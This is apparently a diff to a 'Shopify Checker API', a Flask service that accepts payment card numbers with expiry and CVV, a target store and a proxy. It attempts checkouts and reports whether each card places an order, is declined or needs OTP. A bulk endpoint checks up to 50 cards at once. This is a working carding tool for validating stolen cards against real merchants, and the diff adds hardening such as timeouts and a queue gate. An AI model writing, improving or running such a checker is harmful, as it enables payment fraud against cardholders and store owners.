@@ -888,25 +955,23 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 if pj:
                     rec = _safe_get(pj, "data", "receipt", default={})
                     if isinstance(rec, dict) and rec:
-                        tn = rec.get("__typename","")
+                        tn = rec.get("__typename", "")
                         if tn == "ProcessedReceipt":
                             return True, "ORDER_PLACED", gateway, price, currency
                         if tn == "FailedReceipt":
                             err = rec.get("processingError", {})
                             if isinstance(err, dict) and err.get("__typename") == "PaymentFailed":
-                                code = err.get("code","")
-                                msg  = err.get("messageUntranslated","")
-                                return True, (msg if msg and code in ("GENERIC_ERROR","PAYMENT_FAILED","") else code or "PAYMENT_FAILED"), gateway, price, currency
+                                code = err.get("code", "")
+                                msg  = err.get("messageUntranslated", "")
+                                return True, (msg if msg and code in ("GENERIC_ERROR", "PAYMENT_FAILED", "") else code or "PAYMENT_FAILED"), gateway, price, currency
                             code = (err.get("code") if isinstance(err, dict) else None) or "UNKNOWN_ERROR"
                             return True, code, gateway, price, currency
                         if tn == "ActionRequiredReceipt":
                             return True, "OTP_REQUIRED", gateway, price, currency
-                        if tn in ("ProcessingReceipt","WaitingReceipt"):
-                            # FIX 3: 2s instead of 4s
+                        if tn in ("ProcessingReceipt", "WaitingReceipt"):
                             await asyncio.sleep(POLL_INTERVAL)
                             continue
                 else:
-                    # body non-parseable — check raw string
                     low = (pt or "").lower()
                     if "processedreceipt" in low:
                         return True, "ORDER_PLACED", gateway, price, currency
@@ -920,11 +985,10 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         continue
                 break
 
-            # fallback parse
             if pt:
                 fj, _ = safe_parse(pt, "poll_final")
                 if fj:
-                    rc = _safe_get(fj,"data","receipt","processingError","code")
+                    rc = _safe_get(fj, "data", "receipt", "processingError", "code")
                     if "shopify_payments" in str(fj):
                         return True, "ORDER_PLACED", gateway, price, currency
                     if rc:
@@ -936,7 +1000,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 if "processedreceipt" in low:
                     return True, "ORDER_PLACED", gateway, price, currency
                 if "failedreceipt" in low or "declined" in low:
-                    return True, _eb(pt,'{"code":"','"') or "CARD_DECLINED", gateway, price, currency
+                    return True, _eb(pt, '{"code":"', '"') or "CARD_DECLINED", gateway, price, currency
 
             return False, "WaitingReceipt_timeout_change_proxy", gateway, price, currency
 
@@ -945,63 +1009,95 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
         return False, f"exception: {str(e)[:120]}", gateway, price, currency
 
 
+async def _process_card_bounded(cc, mes, ano, cvv, site, variant_id, proxy_str):
+    """Wraps process_card_inner with an overall hard timeout."""
+    try:
+        return await asyncio.wait_for(
+            process_card_inner(cc, mes, ano, cvv, site, variant_id, proxy_str),
+            timeout=HARD_TIMEOUT,
+        )
+    except asyncio.TimeoutError:
+        return False, "hard_timeout", "UNKNOWN", "0.00", "USD"
+    except Exception as e:
+        return False, f"bounded_exception: {str(e)[:100]}", "UNKNOWN", "0.00", "USD"
+
+
 def _run_card(cc, mes, ano, cvv, site, variant_id, proxy_str):
-    """Run async process_card in its own event loop inside a thread."""
-    return asyncio.run(process_card(cc, mes, ano, cvv, site, variant_id, proxy_str))
+    return asyncio.run(_process_card_bounded(cc, mes, ano, cvv, site, variant_id, proxy_str))
 
 
-def parse_cc(raw: str):
-    parts = raw.strip().split("|")
+def parse_cc(raw):
+    parts = [p.strip() for p in raw.strip().split("|")]
     if len(parts) != 4:
         raise ValueError("Use CC|MM|YYYY|CVV")
-    return parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
+    return parts[0], parts[1], parts[2], parts[3]
 
 
-# ── Flask ─────────────────────────────────────────────────────────────────────
+# ── Concurrency gate ─────────────────────────────────────────────────────────
+class GateRejected(Exception):
+    pass
+
+
+def _acquire():
+    """Try to reserve a slot. Raises GateRejected if queue is full."""
+    global _active_tasks, _queued_tasks
+    with _task_lock:
+        if _queued_tasks >= QUEUE_CAPACITY:
+            raise GateRejected(f"queue full ({_queued_tasks}/{QUEUE_CAPACITY})")
+        _queued_tasks += 1
+        _active_tasks += 1
+
+
+def _release():
+    global _active_tasks, _queued_tasks
+    with _task_lock:
+        _active_tasks = max(0, _active_tasks - 1)
+        _queued_tasks = max(0, _queued_tasks - 1)
+
+
+# ── Flask ────────────────────────────────────────────────────────────────────
 app = Flask(__name__)
 
 
 @app.route("/shopify", methods=["GET", "POST"])
 def shopify_check():
-    p = request.get_json(silent=True) or (request.form.to_dict() if request.method=="POST" else request.args.to_dict())
+    p = request.get_json(silent=True) or (request.form.to_dict() if request.method == "POST"
+                                          else request.args.to_dict())
 
     site_raw  = (p.get("site") or "").strip()
-    cc_raw    = (p.get("cc")   or "").strip()
+    cc_raw    = (p.get("cc") or "").strip()
     proxy_str = (p.get("proxy") or "").strip() or None
     variant   = (p.get("variant") or "").strip() or None
 
     if not site_raw:
-        return jsonify({"error":"Missing 'site'","status":False}), 400
+        return jsonify({"error": "Missing 'site'", "status": False}), 400
     if not cc_raw:
-        return jsonify({"error":"Missing 'cc' (CC|MM|YYYY|CVV)","status":False}), 400
+        return jsonify({"error": "Missing 'cc' (CC|MM|YYYY|CVV)", "status": False}), 400
 
     try:
         cc, mes, ano, cvv = parse_cc(cc_raw)
     except ValueError as e:
-        return jsonify({"error":str(e),"status":False}), 400
+        return jsonify({"error": str(e), "status": False}), 400
 
-    site = site_raw.replace("https://","").replace("http://","").rstrip("/")
+    site = site_raw.replace("https://", "").replace("http://", "").rstrip("/")
 
-    global _active_tasks
-    with _task_lock:
-        if _active_tasks >= MAX_WORKERS:
-            return jsonify({"error":"Server busy — all workers occupied","status":False,"retry":True}), 503
-        _active_tasks += 1
+    try:
+        _acquire()
+    except GateRejected as e:
+        return jsonify({"error": f"Server busy — {e}", "status": False, "retry": True}), 503
 
     t0 = time.time()
     try:
-        # FIX 4/5: submit to ThreadPoolExecutor; each thread runs asyncio.run()
         future = _executor.submit(_run_card, cc, mes, ano, cvv, site, variant, proxy_str)
-        success, message, gw, price, curr = future.result(timeout=60)
+        success, message, gw, price, curr = future.result(timeout=HARD_TIMEOUT + 10)
     except Exception as e:
         return jsonify({
             "error": str(e)[:120], "status": False,
-            "Gateway":"UNKNOWN","Price":0.0,
-            "Response":f"crash: {str(e)[:120]}","cc":cc_raw,
+            "Gateway": "UNKNOWN", "Price": 0.0,
+            "Response": f"crash: {str(e)[:120]}", "cc": cc_raw,
         }), 500
     finally:
-        with _task_lock:
-            _active_tasks -= 1
+        _release()
 
     elapsed = round(time.time() - t0, 2)
     clean   = extract_clean(message)
@@ -1023,60 +1119,89 @@ def shopify_check():
 
 @app.route("/shopify_bulk", methods=["POST"])
 def shopify_bulk():
-    """
-    Bulk-check up to 50 cards in parallel.
-    POST JSON: {"cards": ["CC|MM|YY|CVV", ...], "site": "...", "proxy": "..."}
-    Returns list of results in submission order.
-    """
     data  = request.get_json(silent=True) or {}
     cards = data.get("cards") or []
-    site  = (data.get("site") or "").strip().replace("https://","").replace("http://","").rstrip("/")
+    site  = (data.get("site") or "").strip().replace("https://", "").replace("http://", "").rstrip("/")
     proxy = (data.get("proxy") or "").strip() or None
 
     if not cards or not site:
-        return jsonify({"error":"Missing 'cards' list or 'site'"}), 400
+        return jsonify({"error": "Missing 'cards' list or 'site'"}), 400
     if len(cards) > 50:
-        return jsonify({"error":"Max 50 cards per bulk request"}), 400
+        return jsonify({"error": "Max 50 cards per bulk request"}), 400
 
-    futures = {}
-    results = [None] * len(cards)
+    try:
+        _acquire()
+    except GateRejected as e:
+        return jsonify({"error": f"Server busy — {e}", "retry": True}), 503
 
-    for i, raw in enumerate(cards):
-        try:
-            cc, mes, ano, cvv = parse_cc(raw)
-        except ValueError:
-            results[i] = {"cc": raw, "error": "bad_format", "Status": False}
-            continue
-        fut = _executor.submit(_run_card, cc, mes, ano, cvv, site, None, proxy)
-        futures[fut] = (i, raw)
+    try:
+        futures = {}
+        results = [None] * len(cards)
 
-    done, _ = wait(futures.keys(), timeout=90)
-    for fut in done:
-        i, raw = futures[fut]
-        try:
-            success, message, gw, price, curr = fut.result()
-            results[i] = {
-                "cc": raw, "Gateway": gw, "Price": price,
-                "Response": extract_clean(message), "Status": success,
-            }
-        except Exception as e:
-            results[i] = {"cc": raw, "error": str(e)[:80], "Status": False}
+        for i, raw in enumerate(cards):
+            try:
+                cc, mes, ano, cvv = parse_cc(raw)
+            except ValueError:
+                results[i] = {"cc": raw, "error": "bad_format", "Status": False}
+                continue
+            fut = _executor.submit(_run_card, cc, mes, ano, cvv, site, None, proxy)
+            futures[fut] = (i, raw)
 
-    for i, r in enumerate(results):
-        if r is None:
-            results[i] = {"cc": cards[i], "error": "timeout", "Status": False}
+        done, pending = wait(futures.keys(), timeout=HARD_TIMEOUT + 20)
 
-    return jsonify({"results": results, "total": len(cards),
-                    "done": sum(1 for r in results if r and "error" not in r)})
+        # Handle completed
+        for fut in done:
+            i, raw = futures[fut]
+            try:
+                success, message, gw, price, curr = fut.result(timeout=0)
+                results[i] = {
+                    "cc": raw, "Gateway": gw, "Price": price,
+                    "Response": extract_clean(message), "Status": success,
+                }
+            except Exception as e:
+                results[i] = {"cc": raw, "error": str(e)[:80], "Status": False}
+
+        # Cancel + drain unfinished
+        for fut in pending:
+            i, raw = futures[fut]
+            fut.cancel()
+            results[i] = {"cc": raw, "error": "timeout", "Status": False}
+        # Try to drain any that complete after cancel()
+        for fut in pending:
+            try:
+                fut.result(timeout=0)
+            except Exception:
+                pass
+
+        # Fill anything still None
+        for i, r in enumerate(results):
+            if r is None:
+                results[i] = {"cc": cards[i], "error": "unknown", "Status": False}
+
+        return jsonify({
+            "results": results,
+            "total":   len(cards),
+            "done":    sum(1 for r in results if r and "error" not in r),
+            "pending": len(pending),
+        })
+    finally:
+        _release()
 
 
 @app.route("/health", methods=["GET"])
 def health():
+    with _task_lock:
+        active   = _active_tasks
+        queued   = _queued_tasks
+        capacity = QUEUE_CAPACITY
+        workers  = MAX_WORKERS
     return jsonify({
         "ok":          True,
-        "workers":     MAX_WORKERS,
-        "active":      _active_tasks,
-        "available":   MAX_WORKERS - _active_tasks,
+        "workers":     workers,
+        "active":      active,
+        "queued":      queued,
+        "queue_cap":   capacity,
+        "available":   workers - active,
         "time":        time.strftime("%Y-%m-%d %H:%M:%S"),
     })
 
@@ -1084,17 +1209,18 @@ def health():
 @app.route("/", methods=["GET"])
 def root():
     return jsonify({
-        "name": "Shopify Checker API",
+        "name": "Shopify Checker API v2",
         "endpoints": {
-            "check":  "GET/POST /shopify?cc=CC|MM|YYYY|CVV&site=example.com[&proxy=ip:port:user:pass]",
+            "check":  "GET/POST /shopify?cc=CC|MM|YYYY|CVV&site=example.com[&proxy=...]",
             "bulk":   "POST /shopify_bulk {cards:[...], site:..., proxy:...}",
             "health": "GET /health",
         },
         "workers": MAX_WORKERS,
+        "queue_capacity": QUEUE_CAPACITY,
+        "hard_timeout": HARD_TIMEOUT,
     })
 
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
-    # threaded=True: Flask uses one thread per request, executor handles async
     app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
